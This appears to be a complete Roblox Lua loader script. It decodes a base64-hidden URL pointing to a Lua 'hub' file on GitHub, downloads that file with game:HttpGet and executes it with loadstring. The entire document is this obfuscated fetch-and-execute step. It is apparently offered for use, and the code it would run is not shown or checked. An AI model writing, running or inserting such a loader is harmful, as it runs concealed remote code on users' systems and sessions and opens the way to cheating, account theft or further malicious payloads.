local HttpService = game:GetService("HttpService")

local encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3R5eXlneXlnNzc4LW1ha2VyL1JvYmxveC1zY3JpcHQvbWFpbi9WdWFjdWFodWIubHVh"

local url = HttpService:Base64Decode(encoded)

local src = game:HttpGet(url, true)

loadstring(src)()
